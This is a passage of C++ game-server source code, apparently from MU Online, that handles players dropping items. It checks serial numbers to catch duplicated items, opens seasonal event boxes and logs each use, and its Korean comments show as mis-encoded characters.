			pResult.Result = 0x00;
		}
	}
#endif // ADD_NEWPVP_PKFIELD

#ifdef MODIFY_QUEST_SYSTEM_20070525	// ����Ʈ ������ �ٴڿ� ���� �� ����.
	if( lpObj->pInventory[lpMsg->Ipos].m_QuestItem )
	{
		return 0xFF;
	}
#endif	
	
	if( pResult.Result == 0x01 )
	{
		ItemIsBufExOption(NewOption, &lpObj->pInventory[lpMsg->Ipos]);

		int map_num = lpObj->MapNumber;	
		int type    = lpObj->pInventory[lpMsg->Ipos].m_Type;
		int level   = lpObj->pInventory[lpMsg->Ipos].m_Level;
		float dur   = lpObj->pInventory[lpMsg->Ipos].m_Durability;
		int ret     = lpObj->pInventory[lpMsg->Ipos].IsItem();
		BYTE Option1= lpObj->pInventory[lpMsg->Ipos].m_Option1;
		BYTE Option2= lpObj->pInventory[lpMsg->Ipos].m_Option2;
		BYTE Option3= lpObj->pInventory[lpMsg->Ipos].m_Option3;
		BYTE NOption= lpObj->pInventory[lpMsg->Ipos].m_NewOption;
		DWORD s_num = lpObj->pInventory[lpMsg->Ipos].m_Number;

#ifdef DARKLORD_WORK
		int	 PetLevel = lpObj->pInventory[lpMsg->Ipos].m_PetItem_Level;
		int	 PetExp = 	lpObj->pInventory[lpMsg->Ipos].m_PetItem_Exp;
#endif

		BYTE SOption= lpObj->pInventory[lpMsg->Ipos].m_SetOption;

#ifdef ADD_380ITEM_NEWOPTION_20060711
	#ifdef MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
		BYTE ItemEffectEx = lpObj->pInventory[lpMsg->Ipos].m_ItemOptionEx;
	#else
		BYTE ItemEffectEx = lpObj->pInventory[lpMsg->Ipos].m_ItemOptionEx>>7;
	#endif // MODIFY_380_ITEM_OPTION_DELETE_AT_DROP_20060919
#endif // ADD_380ITEM_NEWOPTION_20060711

#ifdef ADD_ITEM_SOCKET_OPTION_EXTEND_20080422
		BYTE SocketOption[MAX_SOCKET_SLOT];
		BYTE SocketBonusOption;

		g_SocketOptionSystem.GetSocketOption( &lpObj->pInventory[lpMsg->Ipos], SocketOption, SocketBonusOption );
#endif // ADD_ITEM_SOCKET_OPTION_EXTEND_20080422

		DWORD item_number = lpObj->pInventory[lpMsg->Ipos].m_Number;
		char szItemName[50]="Item";

#ifdef EXTEND_LOG_SYSTEM_03_20060816
	#ifdef ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
		BYTE ItemExOption = g_kJewelOfHarmonySystem.GetItemStrengthenOption( &lpObj->pInventory[lpMsg->Ipos] );
		BYTE ItemExLevel = g_kJewelOfHarmonySystem.GetItemOptionLevel( &lpObj->pInventory[lpMsg->Ipos] );
	#endif // ADD_JEWEL_OF_HARMONY_SYSTEM_20060530
#endif // EXTEND_LOG_SYSTEM_03_20060816

#ifdef ANTIHACKING_SERIAL_0_ITEM_20051202	
		if( gObjCheckSerial0ItemList(&lpObj->pInventory[lpMsg->Ipos]) )
		{
			// MODIFY_LOCALIZING_WTF_20060309 ���ö���¡ wtf ���� ������Ʈ 0.99.60 - 0.99.94
			MsgOutput( lpObj->m_Index, lMsg.Get(3354) );			// "����� �� �����ϴ�. �����Ϳ� �����ϼ���."
			LogAddTD("[ANTI-HACK][Serial 0 Item] [ItemDrop] (%s)(%s) Item(%s) Pos(%d)", 
				lpObj->AccountID, lpObj->Name, lpObj->pInventory[lpMsg->Ipos].GetName(), lpMsg->Ipos);
			CopyItem = 1;
			pResult.Result = 0x00;
			ret = FALSE;
		}
#endif
		
		if( gObjInventorySearchSerialNumber(lpObj, item_number) == FALSE )
		{
			CopyItem = 1;
			pResult.Result = 0x00;
			ret = FALSE;
		}

		// ����ڰ� �������� �ϴ� �������� �����ϴ� �������ΰ�?	
		if( ret == TRUE ) 
		{		
			strcpy( szItemName, lpObj->pInventory[lpMsg->Ipos].GetName());

	#ifdef EVENT_SERVER_OPEN_COMMEMORATION_20050510
			if( type == MAKE_ITEMNUM(13,10) && level == 6 ) // ���� ���� �ϰ��
			{	
				MsgOutput( aIndex, "���� ���� ����6 �� ������ �����ϴ�.");		
				pResult.Result = 0x00;
				DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
				return FALSE;
			}	
	#endif // EVENT_SERVER_OPEN_COMMEMORATION_20050510

	//testcat@
	#ifdef HAPPY_POUCH
			if (ret && type == MAKE_ITEMNUM(14,11)) //RED POUCH - ���� ���ָӴϴ� �������� �����ϴ�.
			{	
				if (level == 15)
				{						
					DropHappyItemOfRedPouch(&gObj[aIndex]);

					pResult.Result = 0x01;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					
					gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
					return TRUE;
				}
				else if ( level == 14 ) // �Ķ����ָӴ� apple��20050203 - (NOTICE) MU_CHN_THANKS_COOKIE_EVENT_20040908 ������ �ڵ� �ߺ�
				{
					MsgOutput( aIndex, "�Ķ����ָӴϴ� ������ �����ϴ�.");		
					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}
			}
		
	#endif//HAPPY_POUCH

			
			if( type == MAKE_ITEMNUM(14,11) ) // ����� �����̸�..
			{
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				pResult.Result = 0x01;
				if( level == 1 )
				{	// ��ź�� ��
					StarOfXMasOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of StarOfXMas Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of StarOfXMas Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);					

				}
				else if( level == 2 )
				{	// ����
					FireCrackerOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of FireCracker Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of FireCracker Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);					

				}
				else if( level == 3 )
				{	// ����� ��Ʈ
					HeartOfLoveOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of HeartOfLove Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of HeartOfLove Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
				else if( level == 6 )
				{	// �ݸ޴�
					GoldMedalOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of GoldMedal Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of GoldMedal Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
				else if( level == 5 )
				{	// ���޴�
					SilverMedalOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of SilverMedal Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of SilverMedal Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
				else if( level == 7 )
				{	// Ȳ���� ����
					EventChipOpenEven(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of EventChip Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of EventChip Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
				else if( level == 8 )
				{
					EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 50000);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-8 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-8 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}				
				else if( level == 9 )
				{
					EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 100000);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-9 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-9 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}				
				else if( level == 10 )
				{
					EledoradoBoxOpenEven(&gObj[aIndex], level, 2, 150000);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-10 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox-10 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}				
				else if( level == 11 )
				{
					EledoradoBoxOpenEven(&gObj[aIndex], level, 1, 200000);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-11 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-11 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}				
				else if( level == 12 )
				{
					EledoradoBoxOpenEven(&gObj[aIndex], level, 0, 250000);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-12 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of ElradoraBox1-12 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
#ifdef DARK_LORD_HEART_EVENT_20040810				// ��ũ�ε��� ���� ������ ��� ó��
				else if( level == 13 )
				{
					DarkLordHeartItemBoxOpen(&gObj[aIndex]);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of DarkLordHeart Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of DarkLordHeart Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}
#endif
#ifdef MU_CHN_THANKS_COOKIE_EVENT_20040908		// �߱� ���� �̺�Ʈ
				else if( level == 14 )
				{
					ChnThanksCookieEvent->DropItem(lpObj->m_Index);
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
					LogAddTD("[%s][%s][%d]%d/%d Used box of China Event-14 Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD("[%s][%s][%d]%d/%d Used box of China Event-14 Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
						     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
				}					
#endif
				else if ( level == 0 ) //happcat@20050202 - Level �� 0�� ��쿡�� ����� �����̴�.
				{	// ����� ����
					LuckyBoxOpenEven(&gObj[aIndex]);
					LogAddTD(lMsg.Get(478),lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);					
				}
				else //happcat@20050202 - �� ���� ���� ����� �� ����.
				{					
					pResult.Result = 0x00;
					DataSend(aIndex, (LPBYTE)&pResult, pResult.h.size);
					return FALSE;
				}

#ifdef EXTEND_LOG_SYSTEM_20060202
				LogAddTD("[%s][%s] Used box of luck (level:%d)",
					lpObj->AccountID, lpObj->Name, level );
#endif
			}
			
#ifdef CHRISTMAS_RIBBONBOX_EVENT_20051212		// ũ�������� �������� �̺�Ʈ
			else if( type == MAKE_ITEMNUM( 12, 32 ) )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				
				RedRibbonBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);				
			}
			else if( type == MAKE_ITEMNUM( 12, 33 ) )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				GreenRibbonBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
			else if( type == MAKE_ITEMNUM( 12, 34 ) )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				BlueRibbonBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Christmas RibbonBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
#endif // #ifdef CHRISTMAS_RIBBONBOX_EVENT_20051212
				
#ifdef VALENTINES_DAY_BOX_EVENT_20060124
			else if( type == MAKE_ITEMNUM( 14, 32 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				
				PinkChocolateBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);			
			}
			else if( type == MAKE_ITEMNUM( 14, 33 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				RedChocolateBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}	
			else if( type == MAKE_ITEMNUM( 14, 34 ) && level == 0 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				BlueChocolateBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Valentine's Day ChocolateBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
#endif // #ifdef VALENTINES_DAY_BOX_EVENT_20060124

#ifdef WHITEDAY_CANDY_BOX_EVENT_20060222
			else if( type == MAKE_ITEMNUM( 14, 32 ) && level == 1 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
				
				LightPurpleCandyBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
			else if( type == MAKE_ITEMNUM( 14, 33 ) && level == 1 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				VermilionCandyBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}	
			else if( type == MAKE_ITEMNUM( 14, 34 ) && level == 1 )
			{
				// �κ��丮���� �������� ����.
				gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);	
				
				DeepBlueCandyBoxOpen( &gObj[aIndex] );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used WhiteDay CandyBox Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				     lpObj->AccountID, lpObj->Name,lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3);
			}
#endif // #ifdef WHITEDAY_CANDY_BOX_EVENT_20060222

#ifdef HALLOWINDAY_JACK_O_LANTERN_EVENT_20061017
			else if( type == MAKE_ITEMNUM( 14, 45 ) )
			{
				// ����� ȣ�� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );

				HallowinDayEventItemBoxOpen( lpObj );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[%s][%s][%d]%d/%d Used Pumpkin of Luck Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD("[%s][%s][%d]%d/%d Used Pumpkin of Luck Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}
#endif // HALLOWINDAY_JACK_O_LANTERN_EVENT_20061017

#ifdef CHRISTMAS_STAR_20061211
			else if( type == MAKE_ITEMNUM( 14, 51 ) )
			{
				// ũ���������� �� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );

				ChristmasStarDrop( lpObj );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD( "[%s][%s][%d]%d/%d Used Christmas-Star Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD( "[%s][%s][%d]%d/%d Used Christmas-Star Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
				lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}
#endif
			
#ifdef ADD_FIRECRACKER_NPC_20070306	// ���� �������� ������ ��
			else if( type == MAKE_ITEMNUM( 14, 63 ) )
			{
				// ���� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );
				
				ChristmasStarDrop( lpObj );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD( "[%s][%s][%d]%d/%d Used FireCraker Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD( "[%s][%s][%d]%d/%d Used FireCraker Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}

#ifdef ADD_EVENT_CHERRYBLOSSOM_20080312
			else if( type == MAKE_ITEMNUM( 14, 84 ) )
			{
				// ���ɳ��̻��� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );
				
				CherryBlossomEventItemBoxOpen( &gObj[aIndex], lpObj->MapNumber, lpObj->X, lpObj->Y );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD( "[%s][%s][%d]%d/%d Used CherryBox Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
					LogAddTD( "[%s][%s][%d]%d/%d Used CherryBox Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}
#endif // ADD_EVENT_CHERRYBLOSSOM_20080312

#endif //MODIFY_ITEM_SERIAL_EXPAND_20080227
//------------->
//20081013 �ؿ� ũ�������� �̺�Ʈ - ���� ������(grooving)
#ifdef	UPDATE_XMASEVENT_MAP_20080930
			else if( type == MAKE_ITEMNUM( 14, 99) )
			{
				// ���� ���
				gObjInventoryDeleteItem( aIndex, lpMsg->Ipos );
				
				ChristmasFireCrackerDrop( lpObj );
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD( "[%s][%s][%d]%d/%d Used FireCraker Item Serial:%u (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#else
				LogAddTD( "[%s][%s][%d]%d/%d Used FireCraker Item Serial:%d (%s:%d/level:%d/skill:%d/op2:%d/op3:%d)",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					lpObj->AccountID, lpObj->Name, lpObj->MapNumber, lpObj->X, lpObj->Y, s_num, szItemName, type, level, Option1, Option2, Option3 );
			}
#endif //UPDATE_XMASEVENT_MAP_20080930
			//<-------------
#ifdef HIDDEN_TREASUREBOX_EVENT_20050804
			else if(type == MAKE_ITEMNUM(12,26)) {
				switch(level) {
				case 0:
					{
						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = 0x01;
						INT iType = MAKE_ITEMNUM(12,26);
						INT iDropRate = rand()%100;
						INT iLevel;
						if (iDropRate < 10) {
							iLevel = 3;		// �������� (Ȯ�� 10%)
						}
						else if (iDropRate < 45 ) {
							iLevel = 1;		// �������� (Ȯ�� 35%)
						}
						else {
							iLevel = 2;		// Ǫ������ (Ȯ�� 55%)
						}
						ItemSerialCreateSend(aIndex, lpObj->MapNumber, (BYTE)lpObj->X, (BYTE)lpObj->Y, iType, iLevel, (BYTE)1, 0, 0, 0, lpObj->m_Index, 0);

#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Mysterious Bead : Drop (%d) - serial:%u",
#else
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Mysterious Bead : Drop (%d) - serial:%d",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
							lpObj->AccountID,
							lpObj->Name,
							iLevel,
							s_num
							);
					}
					break;
				case 1:
				case 2:
				case 3:
					{
						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = 0x01;

						PMSG_SERVERCMD	ServerCmd;
						PHeadSubSetB((LPBYTE)&ServerCmd, 0xF3, 0x40, sizeof(ServerCmd));			
						ServerCmd.CmdType = 0;
						ServerCmd.X = lpObj->X;
						ServerCmd.Y = lpObj->Y;
						MsgSendV2(lpObj, (LPBYTE)&ServerCmd, sizeof(ServerCmd));
						DataSend(lpObj->m_Index, (LPBYTE)&ServerCmd, sizeof(ServerCmd));

#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Crystal (%d) - serial:%u",
#else
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Crystal (%d) - serial:%d",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
							lpObj->AccountID,
							lpObj->Name,
							level,
							s_num
							);
					}
					break;
				case 4:
					{
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Hidden Treasure Box - serial:%u",
#else
						LogAddTD("[Hidden TreasureBox Event] [%s][%s] Throw Hidden Treasure Box - serial:%d",
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
							lpObj->AccountID,
							lpObj->Name,
							s_num
							);

						gObjInventoryDeleteItem(aIndex, lpMsg->Ipos);
						pResult.Result = 0x01;
						HiddenTreasureBoxItemBoxOpen(&gObj[aIndex]);
					}
